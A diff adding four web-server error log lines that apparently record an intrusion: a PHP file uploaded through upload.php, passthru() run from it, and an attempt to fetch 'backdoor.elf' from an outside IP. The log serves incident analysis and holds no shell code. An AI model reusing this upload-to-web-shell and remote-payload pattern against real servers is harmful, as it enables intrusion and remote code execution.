@@ -1,0 +1,4 @@
+2026/05/08 13:42:18 [error] 1234#0: *5566 PHP message: PHP Notice:  Undefined variable: type in /var/www/html/upload.php on line 22, client: 185.220.101.45, server: example-ops.com, request: "POST /upload.php HTTP/1.1", host: "example-ops.com"
+2026/05/08 13:42:18 [info] 1234#0: *5566 client uploaded file '/var/www/html/uploads/img_2026.php' size 412 bytes, client: 185.220.101.45
+2026/05/08 13:42:25 [warn] 1234#0: *5567 PHP message: PHP Warning:  passthru(): Cannot execute a blank command in /var/www/html/uploads/img_2026.php on line 1, client: 185.220.101.45
+2026/05/08 13:42:55 [warn] 1234#0: *5568 PHP message: file_get_contents(http://45.135.232.8/backdoor.elf): failed to open stream, client: 185.220.101.45
